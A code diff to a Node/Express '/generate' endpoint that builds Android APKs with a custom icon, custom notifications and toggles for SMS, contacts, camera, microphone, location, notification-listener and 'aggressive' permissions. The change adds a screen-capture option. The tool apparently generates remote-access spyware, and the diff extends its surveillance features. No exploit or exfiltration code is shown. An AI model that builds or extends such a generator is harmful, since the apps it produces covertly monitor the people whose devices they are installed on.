@@ -244,6 +244,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
         enableSmsPermission, enableContactsPermission, enableStoragePermission,
         enableCameraPermission, enableMicrophonePermission, enableNotificationListener,
         enableLocationPermission, enableForegroundNotification, aggressivePermissions, enableFileManagerPermission,
+        enableScreenCapture,
         notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon
     } = req.body;
     const customIcon = req.file;
@@ -291,6 +292,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const isFileManagerEnabled     = enableFileManagerPermission !== undefined
                 ? (enableFileManagerPermission === 'true' || enableFileManagerPermission === true)
                 : isStorageEnabled;
+            const isScreenCaptureEnabled   = enableScreenCapture === 'true' || enableScreenCapture === true;
             const isForegroundNotifEnabled = enableForegroundNotification !== 'false' && enableForegroundNotification !== false;
 
             await sendUpdate('apk_progress', { step: 'Configuring package & permissions...', progress: 35 });
@@ -335,6 +337,11 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                         'android.permission.MANAGE_EXTERNAL_STORAGE'
                     );
                 }
+                if (!isScreenCaptureEnabled) {
+                    permsToNeutralize.push(
+                        'android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION'
+                    );
+                }
                 if (!isForegroundNotifEnabled) {
                     permsToNeutralize.push('android.permission.POST_NOTIFICATIONS');
                 }
@@ -364,6 +371,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 enableContactsPermission:     enableContactsPermission === 'true',
                 enableStoragePermission:      isStorageEnabled,
                 enableFileManagerPermission:  isFileManagerEnabled,
+                enableScreenCapture:          isScreenCaptureEnabled,
                 enableCameraPermission:       enableCameraPermission === 'true',
                 enableMicrophonePermission:   enableMicrophonePermission === 'true',
                 enableLocationPermission:     enableLocationPermission === 'true',
